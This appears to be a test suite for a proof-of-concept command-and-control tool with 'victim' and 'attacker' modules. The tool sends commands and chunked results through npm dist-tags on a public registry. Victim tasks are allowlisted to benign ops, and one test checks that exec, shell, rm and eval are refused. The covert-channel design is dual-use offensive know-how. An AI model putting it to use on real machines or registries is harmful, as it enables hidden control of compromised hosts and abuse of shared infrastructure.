import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { runTask, ALLOWED_OPS } from '../src/victim/tasks.js';
import {
  applyAgentIdentity,
  defaultState,
  createCommandBaseline,
  encodeStableAnnouncementTag,
  loadState,
  processDistTags,
  publishResultTags,
  saveState,
  selectCommands,
} from '../src/victim/agent.js';
import { decodeAnnounceTag, encodeCommandTag, TASK_OPS } from '../src/common/protocol.js';
import {
  createSingleFlight,
  formatLiveNotification,
  pendingDirectTasks,
  sanitizeRegistryText,
} from '../src/attacker/cli.js';
import { assertKnownAgent, defaultAttackerState, loadAttackerState } from '../src/attacker/state.js';

const AGENT = 'a1b2c3d4';

function tmpdir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-agent-'));
}

const silentLogger = {
  debug: () => {},
  info: () => {},
  warn: () => {},
  error: () => {},
};

class FakeClient {
  constructor() {
    this.setCalls = [];
    this.deleteCalls = [];
    this.events = [];
    this.tags = new Map(); // simulated registry contents
  }
  async setDistTag(tag, version) {
    this.setCalls.push([tag, version]);
    this.events.push(['set', tag]);
    this.tags.set(tag, version);
  }
  async deleteDistTag(tag) {
    this.deleteCalls.push(tag);
    this.events.push(['delete', tag]);
    this.tags.delete(tag);
  }
  async getDistTags() {
    return Object.fromEntries(this.tags);
  }
}

// ---------------------------------------------------------------------------
// task dispatch
// ---------------------------------------------------------------------------

test('task dispatch: echo', () => {
  const r = runTask('echo', { text: 'hello' });
  assert.deepEqual(r, { ok: true, output: 'echo: hello' });
});

test('task dispatch: ping / time / sysinfo', () => {
  assert.deepEqual(runTask('ping'), { ok: true, output: 'pong' });
  const t = runTask('time');
  assert.ok(t.ok && !Number.isNaN(Date.parse(t.output)));
  const s = runTask('sysinfo');
  assert.ok(s.ok);
  assert.match(s.output, new RegExp(`platform=${os.platform()}`));
  assert.match(s.output, /arch=/);
});

test('task dispatch: unknown ops are refused, never executed', () => {
  for (const op of ['exec', 'shell', 'rm', 'eval', '']) {
    const r = runTask(op);
    assert.equal(r.ok, false);
    assert.match(r.error, /disallowed|unknown/);
  }
});

test('allowlist matches the protocol op set', () => {
  assert.deepEqual([...ALLOWED_OPS].sort(), [...TASK_OPS].sort());
});

// ---------------------------------------------------------------------------
// command selection / dedup
// ---------------------------------------------------------------------------

test('selectCommands picks only new commands addressed to me or all', () => {
  const tags = {
    latest: '1.0.0',
    [encodeCommandTag(AGENT, 1, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag(AGENT, 2, { op: 'echo', args: { text: 'hi' } })]: '1.0.0',
    [encodeCommandTag('otheragent', 1, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag('all', 1, { op: 'time' })]: '1.0.0',
  };
  const state = defaultState();
  state.lastSeq[AGENT] = 1; // seq 1 already processed
  const { commands, skipped } = selectCommands(tags, state, AGENT);
  assert.equal(skipped.length, 0);
  assert.deepEqual(
    commands.map((c) => [c.agentId, c.seq, c.payload.op]),
    [['all', 1, 'time'], [AGENT, 2, 'echo']],
  );
});

test('malformed tags are skipped, not fatal', () => {
  const tags = {
    'x-cmd-broken': '1.0.0',
    'x-cmd-a1-notaseq-Zm9v': '1.0.0',
    [encodeCommandTag(AGENT, 1, { op: 'ping' })]: '1.0.0',
  };
  const { commands, skipped } = selectCommands(tags, defaultState(), AGENT);
  assert.equal(commands.length, 1);
  assert.equal(skipped.length, 2);
});

// ---------------------------------------------------------------------------
// processing: execution, dedup, result publishing
// ---------------------------------------------------------------------------

test('processDistTags executes new commands and publishes pinned result tags', async () => {
  const cmdTag = encodeCommandTag(AGENT, 1, { op: 'echo', args: { text: 'hi there' } });
  const state = defaultState();
  const client = new FakeClient();
  const stats = await processDistTags({
    distTags: { latest: '1.0.0', [cmdTag]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });
  assert.deepEqual(stats, { executed: 1, resultsPublished: 1, skipped: 0 });
  assert.equal(state.lastSeq[AGENT], 1);
  assert.equal(client.setCalls.length, 1);
  const [tag, version] = client.setCalls[0];
  assert.equal(version, '1.0.0');
  assert.match(tag, /^x-res-a1b2c3d4-1-1of1-/);
});

test('same command tag is executed exactly once, even across state reload', async () => {
  const dir = tmpdir();
  const statePath = path.join(dir, 'victim-state.json');
  const cmdTag = encodeCommandTag(AGENT, 7, { op: 'ping' });
  const distTags = { latest: '1.0.0', [cmdTag]: '1.0.0' };

  // first run: process and persist
  const state1 = loadState(statePath);
  const client1 = new FakeClient();
  const r1 = await processDistTags({
    distTags,
    state: state1,
    agentId: AGENT,
    client: client1,
    logger: silentLogger,
    save: () => saveState(statePath, state1),
  });
  assert.equal(r1.executed, 1);
  assert.equal(client1.setCalls.length, 1);

  // simulate restart: fresh state object reloaded from disk, same tags visible
  const state2 = loadState(statePath);
  const client2 = new FakeClient();
  const r2 = await processDistTags({
    distTags,
    state: state2,
    agentId: AGENT,
    client: client2,
    logger: silentLogger,
    save: () => saveState(statePath, state2),
  });
  assert.equal(r2.executed, 0, 'reloaded state must dedup the same command tag');
  assert.equal(client2.setCalls.length, 0);
});

test('distinct command tags with the same target and sequence execute at most once', async () => {
  const first = encodeCommandTag(AGENT, 1, { op: 'ping' });
  const duplicate = encodeCommandTag(AGENT, 1, { op: 'echo', args: { text: 'duplicate' } });
  const state = defaultState();
  const client = new FakeClient();

  const stats = await processDistTags({
    distTags: { [first]: '1.0.0', [duplicate]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });

  assert.equal(stats.executed, 1);
  assert.equal(stats.skipped, 1);
  assert.equal(client.setCalls.length, 1);
  assert.equal(state.lastSeq[AGENT], 1);
});

test('broadcast commands dedup independently of direct commands', async () => {
  const state = defaultState();
  const client = new FakeClient();
  const distTags = {
    [encodeCommandTag('all', 1, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag(AGENT, 1, { op: 'ping' })]: '1.0.0',
  };
  const r = await processDistTags({
    distTags,
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });
  assert.equal(r.executed, 2, 'all#1 and <me>#1 are different seq spaces');
  assert.equal(state.lastSeq.all, 1);
  assert.equal(state.lastSeq[AGENT], 1);
});

test('runtime accepts broadcast tags without a heartbeat lease', async () => {
  const broadcast = encodeCommandTag('all', 1, { op: 'ping', ts: 1 });
  const state = defaultState();
  const client = new FakeClient();
  const stats = await processDistTags({
    distTags: { [broadcast]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });

  assert.equal(stats.executed, 1);
  assert.equal(stats.skipped, 0);
  assert.equal(state.lastSeq.all, 1);
  assert.equal(client.deleteCalls.length, 0, 'broadcast must remain for other agents');
});

test('state is marked processed even when result publishing fails', async () => {
  const cmdTag = encodeCommandTag(AGENT, 3, { op: 'ping' });
  const state = defaultState();
  const failingClient = {
    async setDistTag() {
      throw new Error('HTTP 401');
    },
  };
  const r = await processDistTags({
    distTags: { [cmdTag]: '1.0.0' },
    state,
    agentId: AGENT,
    client: failingClient,
    logger: silentLogger,
  });
  assert.equal(r.executed, 1);
  assert.equal(r.resultsPublished, 0);
  assert.equal(state.lastSeq[AGENT], 3, 'at-most-once execution beats at-least-once delivery');
});

test('large task output is published as multiple chunk tags', async () => {
  // sysinfo output (~200+ chars JSON) exceeds one tag from a tiny command
  const cmdTag = encodeCommandTag(AGENT, 1, { op: 'sysinfo' });
  const state = defaultState();
  const client = new FakeClient();
  await processDistTags({
    distTags: { [cmdTag]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });
  assert.ok(client.setCalls.length > 1, 'expected chunked result');
  for (const [tag] of client.setCalls) {
    assert.ok(tag.length <= 214);
    assert.match(tag, /^x-res-a1b2c3d4-1-\d+of\d+-/);
  }
});

test('silently dropped result chunks are re-published until visible', async () => {
  // registries can lose a dist-tag write that returned success when another
  // writer updates the package concurrently (observed on registry.npmjs.org)
  const cmdTag = encodeCommandTag(AGENT, 1, { op: 'sysinfo' });
  const state = defaultState();
  const client = new FakeClient();
  const baseSet = client.setDistTag.bind(client);
  const dropped = new Set();
  client.setDistTag = async (tag, version) => {
    // silently drop every chunk once: the write "succeeds" but never lands
    if (!dropped.has(tag)) {
      dropped.add(tag);
      client.setCalls.push([tag, version]);
      return;
    }
    return baseSet(tag, version);
  };
  const stats = await processDistTags({
    distTags: { [cmdTag]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });
  assert.equal(stats.resultsPublished, 1);
  const published = client.setCalls.map(([tag]) => tag);
  for (const tag of new Set(published)) {
    assert.ok(tag in (await client.getDistTags()), `chunk missing from registry: ${tag}`);
  }
  assert.ok(published.length > new Set(published).size, 'lost chunks must be re-published');
});

test('publishResultTags gives up after bounded rounds when chunks never stick', async () => {
  const client = {
    setCalls: 0,
    async setDistTag() {
      this.setCalls++;
    },
    async getDistTags() {
      return {}; // nothing ever lands
    },
  };
  await assert.rejects(
    () => publishResultTags(client, ['x-res-a-1-1of2-AAAA', 'x-res-a-1-2of2-BBBB'], { logger: silentLogger }),
    /2\/2 result chunk\(s\) lost after 3 publish attempts/,
  );
  assert.equal(client.setCalls, 6, '2 chunks x 3 rounds');
});

test('direct commands execute without leases and are deleted after processing', async () => {
  const command = encodeCommandTag(AGENT, 1, { op: 'ping', ts: 1 });
  const state = defaultState();
  const client = new FakeClient();
  const stats = await processDistTags({
    distTags: { [command]: '1.0.0' },
    state,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });

  assert.equal(stats.executed, 1);
  assert.equal(stats.skipped, 0);
  assert.equal(state.lastSeq[AGENT], 1);
  assert.equal(client.setCalls.length, 1);
  assert.deepEqual(client.deleteCalls, [command]);
});

test('stable announcement is deterministic and carries no heartbeat metadata', () => {
  const tag = encodeStableAnnouncementTag(AGENT);
  const decoded = decodeAnnounceTag(tag);

  assert.equal(encodeStableAnnouncementTag(AGENT), tag);
  assert.ok(tag.length <= 214);
  assert.deepEqual(decoded.payload, { v: 1 });
  assert.equal('ts' in decoded.payload, false);
  assert.equal('lease' in decoded.payload, false);
});

test('command baseline skips existing direct and broadcast sequences once', () => {
  const state = defaultState();
  state.agentId = AGENT;
  const distTags = {
    latest: '1.0.0',
    [encodeCommandTag(AGENT, 4, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag(AGENT, 7, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag('all', 3, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag('otheragent', 99, { op: 'ping' })]: '1.0.0',
    'x-cmd-broken': '1.0.0',
  };

  const baseline = createCommandBaseline(distTags, state, AGENT);
  assert.notEqual(baseline, state);
  assert.equal(baseline.commandBaselineVersion, 1);
  assert.deepEqual(baseline.lastSeq, { [AGENT]: 7, all: 3 });
  assert.deepEqual(state.lastSeq, {}, 'baseline creation must not mutate the input state');

  const repeated = createCommandBaseline({
    ...distTags,
    [encodeCommandTag(AGENT, 8, { op: 'ping' })]: '1.0.0',
  }, baseline, AGENT);
  assert.equal(repeated, baseline, 'completed baseline is never advanced on restart');
});

test('changing agent identity resets command state so existing commands are baselined', () => {
  const persisted = {
    agentId: 'oldagent',
    lastSeq: { oldagent: 12, all: 8 },
    commandBaselineVersion: 1,
  };

  const reassigned = applyAgentIdentity(persisted, AGENT);

  assert.deepEqual(reassigned, {
    agentId: AGENT,
    lastSeq: {},
    commandBaselineVersion: 0,
  });
  assert.deepEqual(persisted, {
    agentId: 'oldagent',
    lastSeq: { oldagent: 12, all: 8 },
    commandBaselineVersion: 1,
  }, 'identity application must not mutate persisted state');

  const existingCommands = {
    [encodeCommandTag(AGENT, 4, { op: 'ping' })]: '1.0.0',
    [encodeCommandTag('all', 9, { op: 'ping' })]: '1.0.0',
  };
  const baselined = createCommandBaseline(existingCommands, reassigned, AGENT);

  assert.deepEqual(baselined.lastSeq, { [AGENT]: 4, all: 9 });
  assert.deepEqual(selectCommands(existingCommands, baselined, AGENT).commands, []);
});

test('commands published after the baseline execute normally', async () => {
  const oldCommand = encodeCommandTag(AGENT, 2, { op: 'ping' });
  const baseline = createCommandBaseline({ [oldCommand]: '1.0.0' }, defaultState(), AGENT);
  const newCommand = encodeCommandTag(AGENT, 3, { op: 'ping' });
  const client = new FakeClient();

  const stats = await processDistTags({
    distTags: { [oldCommand]: '1.0.0', [newCommand]: '1.0.0' },
    state: baseline,
    agentId: AGENT,
    client,
    logger: silentLogger,
  });

  assert.equal(stats.executed, 1);
  assert.equal(baseline.lastSeq[AGENT], 3);
});

test('state file round-trip, private mode, and fail-closed corruption handling', () => {
  const dir = tmpdir();
  const p = path.join(dir, 'state.json');
  const s = defaultState();
  s.agentId = AGENT;
  s.lastSeq[AGENT] = 5;
  s.commandBaselineVersion = 1;
  saveState(p, s);
  if (process.platform !== 'win32') {
    assert.equal(fs.statSync(p).mode & 0o777, 0o600);
  }
  assert.deepEqual(loadState(p), s);
  fs.writeFileSync(p, 'not json {');
  assert.throws(() => loadState(p), /cannot load state/);
  assert.deepEqual(loadState(path.join(dir, 'missing.json')), defaultState());
});

test('pending direct tasks are derived from local request/response history', () => {
  const history = [
    { dir: 'out', target: 'agent1', seq: 3, op: 'pwd', ts: 1000 },
    { dir: 'out', target: 'agent2', seq: 4, op: 'ping', ts: 2000 },
    { dir: 'out', target: 'agent1', seq: 5, op: 'pwd', ts: 2500 },
    { dir: 'out', target: 'all', seq: 5, op: 'ping', ts: 3000 },
    { dir: 'in', agentId: 'agent2', seq: 4, op: 'ping', ts: 4000 },
    { dir: 'in', agentId: 'agent1', seq: 5, op: 'ping', ts: 5000 },
  ];

  assert.deepEqual(pendingDirectTasks(history), [history[0], history[2]]);
  assert.deepEqual(pendingDirectTasks(history, { now: 7_000, ttlMs: 5_000 }), [history[2]]);
});

test('registry result text cannot inject terminal controls or unbounded output', () => {
  assert.equal(sanitizeRegistryText('\u001b[31mFAIL\nnext\tline'), 'FAIL\\nnext\\tline');
  assert.equal(sanitizeRegistryText('x'.repeat(5_000)).length, 4_000);
});

test('legacy attacker state preserves durable data and drops heartbeat-only fields', () => {
  const dir = tmpdir();
  const statePath = path.join(dir, 'attacker-state.json');
  fs.writeFileSync(statePath, JSON.stringify({
    presenceVersion: 1,
    agents: [AGENT],
    sent: 3,
    history: [{ dir: 'out', target: AGENT, seq: 1, op: 'ping' }],
    agentInfo: { [AGENT]: { ts: 9_999_999_999, host: 'future-host', cwd: '/tmp' } },
  }));

  const loaded = loadAttackerState(statePath);
  assert.deepEqual(loaded.agents, [AGENT]);
  assert.equal(loaded.sent, 3);
  assert.equal(loaded.history.length, 1);
  assert.equal('presenceVersion' in loaded, false);
  assert.equal('agentInfo' in loaded, false);
});

test('attacker state fails closed on corrupt JSON but permits a missing file', () => {
  const dir = tmpdir();
  const statePath = path.join(dir, 'attacker-state.json');
  assert.deepEqual(loadAttackerState(statePath), defaultAttackerState());
  fs.writeFileSync(statePath, '{ broken');
  assert.throws(() => loadAttackerState(statePath), /cannot load attacker state/);
});

test('direct tasking requires a historically known agent', () => {
  assert.doesNotThrow(() => assertKnownAgent({ agents: [AGENT] }, AGENT));
  assert.throws(() => assertKnownAgent({ agents: [AGENT] }, 'missing'), /not known/);
});

test('single-flight polling makes concurrent callers await one refresh', async () => {
  let calls = 0;
  let release;
  const gate = new Promise((resolve) => { release = resolve; });
  const refresh = createSingleFlight(async () => {
    calls++;
    await gate;
    return 7;
  });

  const first = refresh();
  const second = refresh();
  assert.equal(calls, 1);
  release();
  assert.deepEqual(await Promise.all([first, second]), [7, 7]);
  assert.equal(calls, 1);

  assert.equal(await refresh(), 7);
  assert.equal(calls, 2, 'a completed refresh does not block the next one');
});

test('single-flight polling clears a rejected refresh', async () => {
  let calls = 0;
  const refresh = createSingleFlight(async () => {
    calls++;
    if (calls === 1) throw new Error('registry unavailable');
    return 'ok';
  });

  const first = refresh();
  const joined = refresh();
  await assert.rejects(first, /registry unavailable/);
  await assert.rejects(joined, /registry unavailable/);
  assert.equal(calls, 1);
  assert.equal(await refresh(), 'ok');
  assert.equal(calls, 2);
});

test('live notifications clear an existing terminal prompt first', () => {
  assert.equal(formatLiveNotification('task done', true), '\r\x1b[2Ktask done');
  assert.equal(formatLiveNotification('task done', false), 'task done');
});
